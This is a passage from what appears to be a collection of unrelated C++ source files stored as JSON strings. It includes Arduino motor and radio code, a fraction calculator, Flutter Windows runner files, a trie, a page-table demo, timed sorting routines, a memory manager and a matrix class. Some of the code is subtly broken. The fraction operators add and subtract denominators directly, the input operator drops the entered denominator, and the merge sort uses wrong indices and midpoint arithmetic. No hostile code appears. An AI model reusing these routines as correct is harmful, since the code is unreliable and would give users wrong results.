1.50)\n  float Voltage = (analogRead(PIN_Voltage) * 0.0375); //7.66666=((10 + 1.50) / 1.50)\n  Voltage = Voltage + (Voltage * 0.08);               //Compensation 8%\n  //Serial.println(analogRead(PIN_Voltage) * 4.97 / 1024);\n  Serial.println(Voltage);\n}\n#endif\n/*Motor control*/\nvoid DeviceDriverSet_Motor::DeviceDriverSet_Motor_Init(void)\n{\n  pinMode(PIN_Motor_PWMA, OUTPUT);\n  pinMode(PIN_Motor_PWMB, OUTPUT);\n  pinMode(PIN_Motor_AIN_1, OUTPUT);\n  pinMode(PIN_Motor_BIN_1, OUTPUT);\n  pinMode(PIN_Motor_STBY, OUTPUT);\n}\n\n#if _Test_DeviceDriverSet\nvoid DeviceDriverSet_Motor::DeviceDriverSet_Motor_Test(void)\n{\n  //A...Right\n  //B...Left\n  digitalWrite(PIN_Motor_STBY, HIGH);\n\n  digitalWrite(PIN_Motor_AIN_1, HIGH);\n  analogWrite(PIN_Motor_PWMA, 100);\n  digitalWrite(PIN_Motor_BIN_1, HIGH);\n  analogWrite(PIN_Motor_PWMB, 100);\n ",
    "#include \"Calculator.h\"\n#include <iostream>\n#include <sstream>\nusing namespace std;\n\nCalculator::Calculator() {\n\tsetNumerator(0);\n\tsetDenominator(1);\n}\n\nCalculator::Calculator(const Fraction& frac) {\n\tsetNumerator(frac.getNumerator());\n\tsetDenominator(frac.getDenominator());\n}\n\nCalculator::Calculator(const Calculator& other) {\n\tthis->setDenominator(other.getDenominator());\n\tthis->setNumerator(other.getNumerator());\n}\n\nCalculator operator+(const Calculator& int1, const Calculator& int2) {\n\tCalculator result;\n\tlong res;\n\tunsigned short res1;\n\tres = int1.getNumerator() + int2.getNumerator();\n\tres1 = int1.getDenominator() + int2.getDenominator();\n\tresult.setNumerator(res);\n\tresult.setDenominator(res1);\n\treturn result;\n}\n\nCalculator operator-(const Calculator& int1, const Calculator& int2) {\n\tCalculator result;\n\tlong res;\n\tunsigned short res1;\n\tres = int1.getNumerator() - int2.getNumerator();\n\tres1 = int1.getDenominator() - int2.getDenominator();\n\tresult.setNumerator(res);\n\tresult.setDenominator(res1);\n\treturn result;\n}\n\nCalculator operator*(const Calculator& int1, const Calculator& int2) {\n\tCalculator result;\n\tlong res;\n\tunsigned short res1;\n\tres = int1.getNumerator() * int2.getNumerator();\n\tres1 = int1.getDenominator() * int2.getDenominator();\n\tresult.setNumerator(res);\n\tresult.setDenominator(res1);\n\treturn result;\n}\n\nbool operator >=(const Calculator& int1, const Calculator& int2) {\n\treturn (int1.getNumerator() >= int2.getNumerator()) && (int1.getDenominator() >= int2.getDenominator());\n}\nbool operator <=(const Calculator& int1, const Calculator& int2) {\n\treturn (int1.getNumerator() <= int2.getNumerator()) && (int1.getDenominator() <= int2.getDenominator());\n}\nbool operator !=(const Calculator& int1, const Calculator& int2) {\n\treturn !(int1 == int2);\n}\n\nbool operator==(const Calculator& int1, const Calculator& int2) {\n\treturn (int1.getNumerator() == int2.getNumerator()) && (int1.getDenominator() == int2.getDenominator());\n}\n\nbool operator<(const Calculator& int1, const Calculator& int2) {\n\treturn (int1.getNumerator() < int2.getNumerator()) && (int1.getDenominator() < int2.getDenominator());\n}\n\nbool operator>(const Calculator& int1, const Calculator& int2) {\n\treturn (int1.getNumerator() > int2.getNumerator()) && (int1.getDenominator() > int2.getDenominator());\n}\n\nCalculator Calculator::operator=(const Calculator& other) {\n\tsetNumerator(other.getNumerator());\n\tsetDenominator(other.getDenominator());\n\treturn *this;\n};\n\n\n\nostream& operator << (ostream& out, const Calculator& r)\n{\n\tout << string(r);\n\treturn out;\n}\nistream& operator >> (istream& in, Calculator& r)\n{\n\tlong x;\n\tunsigned short y = 1;\n\tcout << \"Enter Numerator: \"; in >> x;\n\tr.setNumerator(x); cout << endl;\n\tcout << \"Enter Denomirator: \";\n\tin >> x;\n\tr.setDenominator(y); cout << endl;\n\tcout << endl;\n\treturn in;\n}\n\nCalculator::operator string() const {\n\tstringstream ss;\n\tcout << \"Your Numerator: \" << getNumerator() << endl;\n\tcout << \"Your Denomirator: \" << getDenominator() << endl;\n\tss << endl;\n\treturn ss.str();\n}\n\n\nCalculator& Calculator::operator ++()\n{\n\tunsigned short x = getDenominator();\n\tx++;\n\tsetDenominator(x);\n\treturn *this;\n}\nCalculator& Calculator::operator --()\n{\n\tunsigned short x = getDenominator();\n\tx--;\n\tsetDenominator(x);\n\treturn *this;\n}\nCalculator Calculator::operator ++(int)\n{\n\tCalculator t(*this);\n\tunsigned short x = getDenominator();\n\tx++;\n\tt.setDenominator(x);\n\treturn t;\n}\nCalculator Calculator::operator --(int)\n{\n\tCalculator t(*this);\n\tunsigned short x = getDenominator();\n\tx--;\n\tt.setDenominator(x);\n\treturn t;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "//***********************************ASHUTOSH KUMAR***********************************//\r\n/*\r\n\u0915\u0930\u094d\u092e\u0923\u094d\u092f\u0947\u0935\u093e\u0927\u093f\u0915\u093e\u0930\u0938\u094d\u0924\u0947 \u092e\u093e \u092b\u0932\u0947\u0937\u0941 \u0915\u0926\u093e\u091a\u0928\u0964\r\n\u092e\u093e \u0915\u0930\u094d\u092e\u092b\u0932\u0939\u0947\u0924\u0941\u0930\u094d\u092d\u0942\u0930\u094d\u092e\u093e \u0924\u0947 \u0938\u0919\u094d\u0917\u094b\u093d\u0938\u094d\u0924\u094d\u0935\u0915\u0930\u094d\u092e\u0923\u093f\u0965\r\n\r\nKarmanye vadhikaraste Ma Phaleshu Kadachana,\r\nMa Karmaphalaheturbhurma Te Sangostvakarmani,\r\n\r\nThe meaning of the verse is :\u2014\r\nYou have the right to work only but never to its fruits.\r\nLet not the fruits of action be your motive, nor let your attachment be to\r\ninaction\r\n*/\r\n#include <bits/stdc++.h>\r\nusing namespace std;\r\nclass Node\r\n{\r\npublic:\r\n    Node *links[26]; // Array of pointers to child nodes, each representing a character (a-z).\r\n\r\n    // Check if the given character is a key in the children nodes.\r\n    bool ContainsKey(char ch)\r\n    {\r\n        return (links[ch - 'a'] != NULL); // Returns true if the link is not NULL.\r\n    }\r\n\r\n    // Put a new node at the corresponding index of the character.\r\n    void put(char ch, Node *node)\r\n    {\r\n        links[ch - 'a'] = node;\r\n    }\r\n\r\n    // Get the node corresponding to the given character.\r\n    Node *get(char ch)\r\n    {\r\n        return links[ch - 'a'];\r\n    }\r\n};\r\n\r\nint countDistinctSubstrings(string &s)\r\n{\r\n    Node *root = new Node();\r\n    int n = s.size();\r\n    int count = 1;\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        Node *node = root;\r\n        for (int j = i; j < n; j++)\r\n        {\r\n            if (!(node->ContainsKey(s[j])))\r\n            {\r\n                node->put(s[j], new Node());\r\n                count++;\r\n            }\r\n            node = node->get(s[j]);\r\n        }\r\n    }\r\n    return count;\r\n}\r\nint main()\r\n{\r\n    return 0;\r\n}",
    "#include <Arduino.h>\n#include <SPI.h>\n#include <RF24.h>\n\nRF24 radio(7, 8);\nconst byte adresses[][6] = {\"00001\", \"00002\"};\n\n#define BUTTON_PIN_0 2\n#define BUTTON_PIN_1 3\n#define BUTTON_PIN_2 4\n#define BUTTON_PIN_3 5\n#define BUTTON_PIN_4 9\n#define BUTTON_PIN_5 6\n\nint angulos[3];\n\nbool WRITE(){\n  radio.stopListening();\n  \n  bool clicked = false;\n  if(!digitalRead(BUTTON_PIN_0) && angulos[0] > 1){\n    clicked = true;\n    angulos[0] -= 1;\n  }\n  if(!digitalRead(BUTTON_PIN_1) && angulos[0] < 180){\n    clicked = true;\n    angulos[0] += 1;\n  }\n  if(!digitalRead(BUTTON_PIN_2) && angulos[1] > 90){\n    clicked = true;\n    angulos[1] -= 1;\n  }\n  if(!digitalRead(BUTTON_PIN_3) && angulos[1] < 180){\n    clicked = true;\n    angulos[1] += 1;\n  }\n  if(!digitalRead(BUTTON_PIN_4) && angulos[2] > 1){\n    clicked = true;\n    angulos[2] -= 1;\n  }\n  if(!digitalRead(BUTTON_PIN_5) && angulos[2] < 95){\n    clicked = true;\n    angulos[2] += 1;\n  }\n\n  if (clicked) {\n  radio.stopListening();\n  radio.write(&angulos, sizeof(angulos));\n  }\n\n  return clicked;\n}\n\nvoid READ(){\n  radio.startListening();\n\n  if (radio.available()) {\n    radio.read(&angulos, sizeof(angulos));  // L\u00ea a mensagem recebida\n    Serial.println(\"\u00c2ngulo 1: \" + (String)angulos[0]);\n    Serial.println(\"\u00c2ngulo 2: \" + (String)angulos[1]);\n    Serial.println(\"\u00c2ngulo 3: \" + (String)angulos[2]);\n    Serial.println();\n  }\n}\n\nvoid setup() {\n  Serial.begin(115200);\n\n  while(!radio.begin()){\n    Serial.println(\"Conectando ao r\u00e1dio...\");\n    delay(1000);\n  }\n  Serial.println(\"Conectado!\");\n\n  radio.openWritingPipe(adresses[0]); // 00001\n  radio.openReadingPipe(1, adresses[1]); // 00002\n  radio.setPALevel(RF24_PA_MIN);\n\n  pinMode(BUTTON_PIN_0, INPUT_PULLUP);\n  pinMode(BUTTON_PIN_1, INPUT_PULLUP);\n  pinMode(BUTTON_PIN_2, INPUT_PULLUP);\n  pinMode(BUTTON_PIN_3, INPUT_PULLUP);\n  pinMode(BUTTON_PIN_4, INPUT_PULLUP);\n  pinMode(BUTTON_PIN_5, INPUT_PULLUP);\n}\n\nvoid loop() {\n  WRITE();\n  READ();\n  delay(5);\n}",
    "#include <iostream>\r\n#include <unordered_map>\r\n\r\nusing namespace std;\r\n\r\nconst int PAGE_SIZE = 256;           \r\nconst int NUM_PAGES = 256;           \r\nconst int FRAME_SIZE = 256;          \r\nconst int NUM_FRAMES = 256;          \r\n\r\n// Page/Frame Table Initialization\r\nunordered_map<int, int> pageFrameTable;\r\n\r\nvoid PageFrame() {\r\n    for (int page = 0; page < NUM_PAGES; ++page) {\r\n        pageFrameTable[page] = page % NUM_FRAMES;\r\n    }\r\n}\r\n\r\n// Logical to Physical Address Conversion\r\n\r\nvoid AddressConversion(int LogicAdd) {\r\n\r\n    int pageNum = LogicAdd / PAGE_SIZE;  \r\n    int offset = LogicAdd % PAGE_SIZE;      \r\n\r\n    if (pageFrameTable.find(pageNum) == pageFrameTable.end()) {\r\n        cout << \"Page fault occurred for logical address: 0x\" << hex << LogicAdd << endl;\r\n        return;\r\n    }\r\n\r\n    int frameNum = pageFrameTable[pageNum];\r\n\r\n    int PhysicAdd = frameNum * FRAME_SIZE + offset;\r\n\r\n    // Output logical address, page number, offset, physical address\r\n\r\n    cout << \"Logical Address: 0x\" << hex << LogicAdd << endl;\r\n    cout << \"Page Number: 0x\" << hex << pageNum << endl;\r\n    cout << \"Offset: 0x\" << hex << offset << endl;\r\n    cout << \"Physical Address: 0x\" << hex << PhysicAdd << endl << endl;\r\n}\r\n\r\nint main() {\r\n    PageFrame();\r\n\r\n    int logicalAddresses[] = { 0x3A7F, 0xABCD, 0x5678 };\r\n\r\n    for (int i = 0; i < 3; ++i) {\r\n        AddressConversion(logicalAddresses[i]);\r\n    }\r\n    return 0;\r\n}\r\n",
    "#include \"TimedSorts.h\"\r\n\r\nTimedSorts::TimedSorts():data(0,0),length(0) {\r\n\t//Simple \"empty\" value constructor\r\n}\r\n\r\nTimedSorts::TimedSorts(const vector<int>& firstData) {\r\n\tdata = firstData;\r\n\t//Initializing constructor\r\n}\r\n\r\nvoid TimedSorts::fillData(int size) {\r\n\t//Function to set length to size\r\n\t//Then fill data with integers 0 to size-1\r\n\tlength = size;\r\n\tdata.resize(length);\r\n\tsort(data.begin(), data.end(), 0);\r\n}\r\n\r\nvoid TimedSorts::setData(const vector<int>& newData) {\r\n\t//set data and length to passed in values\r\n\tdata = newData;\r\n}\r\n\r\nvoid TimedSorts::PrintData() {\r\n\t//print out all values in data\r\n\tfor (int num : data) {\r\n\t\tcout << num << \" \";\r\n\t}\r\n\tcout << endl;\r\n}\r\n\r\nvoid TimedSorts::scramble(int seed) {\r\n\tif (seed == -2) {\r\n\t\t//Sort array in reverse order\r\n\t\tsort(data.begin(), data.end(), greater<>());\r\n\t}\r\n\telse if (seed == -1)\r\n\t{\r\n\t\t//\"True\" random scramble\r\n\t\trandom_device rd;\r\n\t\tmt19937 g(rd());\r\n\t\tshuffle(data.begin(), data.end(), g);\r\n\t}\r\n\telse if (seed != 0) {\r\n\t\tmt19937 g(seed);\r\n\t\tshuffle(data.begin(), data.end(), g);\r\n\t}\r\n}\r\n\r\nbool TimedSorts::isSorted() {\r\n\t//Check if data is sorted\r\n\treturn is_sorted(data.begin(), data.end());\r\n}\r\n\r\nduration<double, TIME_UNIT> TimedSorts::getLatestSortTime() {\r\n\treturn Duration;\r\n}\r\n\r\nduration<double, TIME_UNIT> TimedSorts::BubbleSort() {\r\n\t//Implement Bubble sort, return time taken to sort\r\n\tauto begin = high_resolution_clock::now();\r\n\tfor (int i = 0; i < length - 1; i++) {\r\n\t\tfor (int j = 0; j < length - i - 1; j++) {\r\n\t\t\tif (data[j] > data[j + 1]) {\r\n\t\t\t\tmySwap(data[j], data[j + 1]);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tauto end = high_resolution_clock::now();\r\n\tDuration = duration_cast<duration<double, TIME_UNIT>>(end - begin);\r\n\treturn Duration;\r\n}\r\n\r\nduration<double, TIME_UNIT> TimedSorts::InsertionSort() {\r\n\t//Implement Insertion sort, return time taken to sort\r\n\tauto begin = high_resolution_clock::now();\r\n\tfor (int i = 1; i < length; i++) {\r\n\t\tint x = data[i];\r\n\t\tint j = i - 1;\r\n\t\twhile (j >= 0 && data[j] > x) {\r\n\t\t\tdata[j + 1] = data[j];\r\n\t\t\tj--;\r\n\t\t}\r\n\t\tdata[j + 1] = x;\r\n\t}\r\n\tauto end = high_resolution_clock::now();\r\n\tDuration = duration_cast<duration<double, TIME_UNIT>> (end - begin);\r\n\treturn Duration;\r\n}\r\n\r\nduration<double, TIME_UNIT> TimedSorts::MergeSort() {\r\n\t//Implement Merge sort, return time taken to sort\r\n\tauto begin = high_resolution_clock::now();\r\n\tmergeSortRecurse(0, length - 1);\r\n\tauto end = high_resolution_clock::now();\r\n\tDuration = duration_cast<duration<double, TIME_UNIT >> (end - begin);\r\n\treturn Duration;\r\n\r\n}\r\n\r\nvoid TimedSorts::mergeSortRecurse(int l, int r) {\r\n\t//Recursive call for Merge sort\r\n\tif (l < r) {\r\n\t\tint m = l + (r - 1) / 2;\r\n\t\tmergeSortRecurse(l, m);\r\n\t\tmergeSortRecurse(m+ 1, r);\r\n\t\tmerge(l, m, r);\r\n\t}\r\n}\r\n\t\r\nvoid TimedSorts::merge(int l, int m, int r) {\r\n\t//Merge function as part of merge sort\r\n\tint d1 = m - l + 1;\r\n\tint d2 = r - m;\r\n\tvector <int> L(d1), R(d2);\r\n\tfor (int i = 0; i < d1; i++) {\r\n\t\tL[i] = data[l + 1];\r\n\t}\r\n\tfor (int j = 0; j < d2; j++) {\r\n\t\tR[j] = data[m + j + 1];\r\n\t}\r\n\r\n\tint i = 0, j = 0, k = l;\r\n\twhile (i < d1 && j < d2) {\r\n\t\tif (L[i] <= R[j]) {\r\n\t\t\tdata[k] = L[i];\r\n\t\t\ti++;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tdata[k] = R[j];\r\n\t\t\tj++;\r\n\t\t}\r\n\t\tk++;\r\n\t}\r\n\twhile (i < d1) {\r\n\t\tdata[k] = L[i];\r\n\t\ti++;\r\n\t\tj++;\r\n\t}\r\n\twhile (j < d2) {\r\n\t\tdata[k] = R[j];\r\n\t\tk++;\r\n\t\tj++;\r\n\t}\r\n}\r\n\r\nduration<double, TIME_UNIT> TimedSorts::QuickSort() {\r\n\t//Implement Quick sort, return time taken to sort\r\n\tauto begin = high_resolution_clock::now();\r\n\tquickSortRecurse(0, length - 1);\r\n\tauto end = high_resolution_clock::now();\r\n\tDuration = duration_cast<duration<double, TIME_UNIT>>(end - begin);\r\n\treturn Duration;\r\n\r\n}\r\n\r\nint TimedSorts::partition(int low, int high)\r\n{\r\n\t//Partition function as part of quick sort\r\n\tint p = data[high];\r\n\tint i = low - 1;\r\n\tfor (int j = low; j <= high - 1; j++) {\r\n\t\tif (data[j] < p) {\r\n\t\t\ti++;\r\n\t\t\tmySwap(data[i], data[j]);\r\n\t\t}\r\n\t}\r\n\tmySwap(data[i + 1], data[high]);\r\n\treturn(i + 1);\r\n}\r\n\r\nvoid TimedSorts::quickSortRecurse(int low, int high)\r\n{\r\n\t//Recursive call for Quick sort\r\n\tif (low < high) {\r\n\t\tint pi = partition(low, high);\r\n\t\tquickSortRecurse(low, pi - 1);\r\n\t\tquickSortRecurse(pi + 1, high);\r\n\t}\r\n}\r\n\r\n\r\n\r\nduration<double, TIME_UNIT> TimedSorts::BuiltInSort() {\r\n\t//Use built-in sort() functio, return time taken to sort\r\n\t//HINT: Look at scramble() for an example of using sort()...\t\r\n\tauto begin = high_resolution_clock::now();\r\n\tsort(data.begin(), data.end());\r\n\tauto end = high_resolution_clock::now();\r\n\tDuration = duration_cast<duration<double, TIME_UNIT>>(end - begin);\r\n\treturn Duration;\r\n}\r\n\r\nvoid TimedSorts::mySwap(int& xp, int& yp) {\r\n    int temp = xp;\r\n    xp = yp;\r\n    yp = temp;\r\n}\r\n",
    "#include \"MemoryManager.h\"\n\nint bestFit(int sizeInWords, void* list) {\n    uint16_t* holeList = (uint16_t*)list;\n    if (holeList == nullptr) {\n        return -1;\n    }\n\n    //iterates through each hole given in list and determines if it is large enough for sizeInWords and if it is the smallest hole\n    int offset = -1;\n    int size = INT_MAX;\n    int index = 2;\n    for (int i = 0; i < holeList[0]; i++) {\n        if (holeList[index] >= sizeInWords && holeList[index] <= size) {\n            size = holeList[index];\n            offset = holeList[index-1];\n        }\n        index += 2;\n    }\n    return offset;\n}\nint worstFit(int sizeInWords, void* list) {\n    uint16_t* holeList = (uint16_t*)list;\n    if (holeList == nullptr) {\n        return -1;\n    }\n\n    //iterates through each hole given in list and determines if it is large enough for sizeInWords and if it is the biggest hole\n    int offset = -1;\n    int size = 0;\n    int index = 2;\n    for (int i = 0; i < holeList[0]; i++) {\n        if (holeList[index] >= sizeInWords && holeList[index] >= size) {\n            size = holeList[index];\n            offset = holeList[index-1];\n        }\n        index += 2;\n    }\n    return offset;\n}\n\n\n\n//constructor\nMemoryManager::MemoryManager(unsigned wordSize, std::function<int(int, void*)> allocator) {\n    this->wordSize = wordSize;\n    this->allocator = allocator;\n}\n\n//destructor\nMemoryManager::~MemoryManager() {\n    shutdown();\n}\n\n//initialize the block of memory\nvoid MemoryManager::initialize(size_t sizeInWords) {\n    if (block != nullptr) {\n        shutdown();\n    }\n    if (initialized) {\n        shutdown();\n    }\n    //set the block size and create a new memory block and chunk of memory as a hole in the vector\n    if (sizeInWords < 65536) {\n        blockSize = wordSize * sizeInWords;\n        block = new char[blockSize];\n        Chunk chunk = Chunk(0, sizeInWords, true);\n        chunks.push_back(chunk);\n        initialized = true;\n    }\n}\n\n//dynamically deletes all memory allocated\nvoid MemoryManager::shutdown() {\n    if (initialized) {\n        delete[] block;\n        block = nullptr;\n        chunks.clear();\n        initialized = false;\n    } \n}\n\n//allocate memory on the block and determines holes\nvoid* MemoryManager::allocate(size_t sizeInBytes) {\n    //calculates size on the memory block to allocate\n    int wordsToAllocate;\n    if (sizeInBytes % getWordSize() != 0) {\n        wordsToAllocate = sizeInBytes/getWordSize() + 1;\n    } else {\n        wordsToAllocate = sizeInBytes/getWordSize();\n    }\n\n    uint16_t* holeList = (uint16_t*)getList();\n\n    //set the fit algorithm and find the offset of where to place the new chunk\n    int offset = allocator(wordsToAllocate, holeList);\n    delete[] holeList;\n    if (offset == -1) {\n        return nullptr;\n    }\n\n    Chunk chunk = Chunk(offset, wordsToAllocate, false);\n    \n    //finds the hole chunk in chunks vector\n    int index;\n    for (int i = 0; i < chunks.size(); i++) {\n        if (chunks[i].offset == chunk.offset) {\n            index = i;\n            break;\n        }\n    }\n    \n    //if the new chunk takes up the length of the hole (delete hole)\n    if (chunk.length == chunks[index].length) {\n        chunks.insert(chunks.begin()+index, chunk);\n        chunks.erase(chunks.begin() + (index+1));\n    } else {\n        //shorten hole\n        chunks[index].offset += chunk.length;\n        chunks[index].length -= chunk.length;\n        chunks.insert(chunks.begin()+index, chunk);\n    }\n\n    return block + (offset*getWordSize());\n}\n\n//frees the provided memory block and merges any holes\nvoid MemoryManager::free(void* address) {\n    int offset = ((char*)address - block)/getWordSize();\n\n    //finds the chunk at the offset\n    int index = -1;\n    for (int i = 0; i < chunks.size(); i++) {\n        if (!chunks[i].isHole && chunks[i].offset == offset) {\n            index = i;\n            break;\n        }\n    }\n\n    if (index == -1) {\n        return;\n    }\n    \n    chunks[index].isHole = true;\n\n    //if to the right is a hole merge    \n    if (index+1 < chunks.size() && chunks[index+1].isHole) {\n        chunks[index].length += chunks[index+1].length;\n        chunks.erase(chunks.begin() + index + 1);\n        chunks[index].isHole = true;\n    }\n    \n    //if to the left is a hole merge\n    if (index-1 >= 0 && chunks[index-1].isHole) {\n        chunks[index].offset = chunks[index-1].offset;\n        chunks[index].length += chunks[index-1].length;\n        chunks[index].isHole = true;\n        chunks.erase(chunks.begin()+index-1);\n    }\n\n}\n\nvoid MemoryManager::setAllocator(std::function<int(int, void*)> allocator) {\n    this->allocator = allocator;\n}\n\nint MemoryManager::dumpMemoryMap(char* filename) {\n    //open file descriptor\n    int fd = open(filename, O_CREAT | O_RDWR | O_TRUNC, 0777);\n    if (fd == -1) {\n        return -1;\n    }\n\n    //get list of holes and format the output string\n    uint16_t* holeList = (uint16_t*)getList();\n    string output;\n    int index = 1;\n    for (int i = 0; i < holeList[",
    "/*\n * @lc app=leetcode.cn id=2 lang=cpp\n *\n * [2] \u4e24\u6570\u76f8\u52a0\n */\n\n// @lc code=start\n/**\n * Definition for singly-linked list.\n * struct ListNode {\n *     int val;\n *     ListNode *next;\n *     ListNode() : val(0), next(nullptr) {}\n *     ListNode(int x) : val(x), next(nullptr) {}\n *     ListNode(int x, ListNode *next) : val(x), next(next) {}\n * };\n */\nclass Solution{\npublic:\n    ListNode* addTwoNumbers(ListNode*& l1, ListNode* l2){\n        ListNode  *head=nullptr,*tail = nullptr;\n        int carry = 0;\n        while(l1 || l2){\n            int n1 = l1?l1->val:0;\n            int n2 = l2?l2->val:0;\n            int sum = n1 + n2 + carry;\n            if(!head){\n                head = tail = new ListNode(sum%10);\n            }else{\n                tail->next = new ListNode(sum%10);\n                tail = tail->next;\n            }\n            carry = sum / 10;\n            if(l1){\n                l1 = l1->next;\n            }\n            if(l2){\n                l2 = l2->next;\n            }\n        }\n        if(carry>0)\n        {\n            tail->next = new ListNode(carry);\n        }\n        return head;\n    }\n};\n// @lc code=end\n\n\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <stdexcept>\r\n#include <algorithm>\r\n#include <windows.h>\r\n\r\nusing namespace std;\r\n\r\nclass IntMatrix {\r\nprivate:\r\n    vector<vector<int>> data;\r\n\r\npublic:\r\n    IntMatrix() {}\r\n\r\n    IntMatrix(initializer_list<vector<int>> list) : data(list) {}\r\n\r\n    vector<int>& operator[](int index) {\r\n        if (index < 0 || index >= data.size()) {\r\n            throw out_of_range(\"Index out of range\");\r\n        }\r\n        return data[index];\r\n    }\r\n\r\n    int maxElement() const {\r\n        if (data.empty() || data[0].empty()) {\r\n            throw length_error(\"Matrix is empty\");\r\n        }\r\n\r\n        int maxElem = data[0][0];\r\n        for (const auto& row : data) {\r\n            auto rowMax = max_element(row.begin(), row.end());\r\n            maxElem = max(maxElem, *rowMax);\r\n        }\r\n        return maxElem;\r\n    }\r\n\r\n    int minElement() const {\r\n        if (data.empty() || data[0].empty()) {\r\n            throw length_error(\"Matrix is empty\");\r\n        }\r\n\r\n        int minElem = data[0][0];\r\n        for (const auto& row : data) {\r\n            auto rowMin = min_element(row.begin(), row.end());\r\n            minElem = min(minElem, *rowMin);\r\n        }\r\n        return minElem;\r\n    }\r\n\r\n    IntMatrix operator*(const IntMatrix& other) const {\r\n        if (data.empty() || other.data.empty() || this->data[0].size() != other.data.size()) {\r\n            throw length_error(\"Matrix dimensions do not match for multiplication\");\r\n        }\r\n\r\n        IntMatrix result;\r\n        result.data.resize(this->data.size(), vector<int>(other.data[0].size(), 0));\r\n\r\n        for (size_t i = 0; i < this->data.size(); ++i) {\r\n            for (size_t j = 0; j < other.data[0].size(); ++j) {\r\n                for (size_t k 